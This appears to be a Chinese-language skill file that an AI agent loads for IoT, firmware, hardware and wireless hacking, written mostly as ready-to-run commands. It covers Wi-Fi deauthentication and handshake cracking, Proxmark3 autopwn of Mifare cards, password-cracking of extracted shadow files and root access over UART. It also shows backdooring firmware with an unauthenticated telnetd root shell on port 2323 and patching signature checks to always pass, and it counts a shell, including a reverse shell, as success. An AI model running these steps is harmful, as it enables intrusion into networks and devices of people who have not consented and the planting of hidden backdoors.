---
name: m-iot
description: "固件与硬件：binwalk 解包、UART/SPI/JTAG、无线、固件改包与签名绕过。"
---

# m-iot · 固件 / 硬件 / 无线电

被读到时：主人要拆固件、看路由器、玩 RFID/蓝牙/无线、做硬件调试。

## 一、固件

```bash
binwalk -e firmware.bin
binwalk -A firmware.bin
strings -n 8 firmware.bin | grep -iE "passwd|admin|key|token"
unsquashfs squashfs-root.sqfs
```

结构：U-Boot 头 + kernel + rootfs（squashfs / jffs2 / cramfs）。

提取 `etc/shadow` 丢给 john；`etc/passwd` 与硬编码串常出默认口令。

QEMU 模拟：

```bash
qemu-mipsel -L ./rootfs ./rootfs/usr/sbin/httpd
```

## 二、硬件接口

| 接口 | 工具 |
|---|---|
| UART | USB-TTL（CH340/CP2102），115200 8N1，找 TX/RX/GND |
| SPI Flash | CH341A + 夹子，`flashrom -p ch341a_spi -r dump.bin` |
| JTAG | OpenOCD + FT2232 |
| I2C | 逻辑分析仪 |

UART：上电看输出，出现 `U-Boot` 提示按任意键进命令行，`printenv` 看 `bootargs`，常有 `init=/bin/sh` 可改。

## 三、无线

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng --deauth 10 -a $BSSID wlan0mon
# 抓握手 -> hashcat -m 22000
bluetoothctl scan on
bettercap -iface hci0
# Proxmark3: hf mf autopwn
```

## 四、固件改包（自有设备）

```bash
echo '/bin/sh -c "telnetd -l /bin/sh -p 2323 &"' >> etc/init.d/rcS
mksquashfs squashfs-root new.sqfs -comp xz
```

重打包要把原厂头按原偏移回填。多数设备只校验 kernel 不校验 rootfs；有签名就找校验函数（常在 `libupgrade.so`），patch 成恒真。

## 五、验收

拿到 shell（串口 / telnet / 反弹），或 dump 出固件能重打包启动。记录接口、波特率、偏移、改动点。
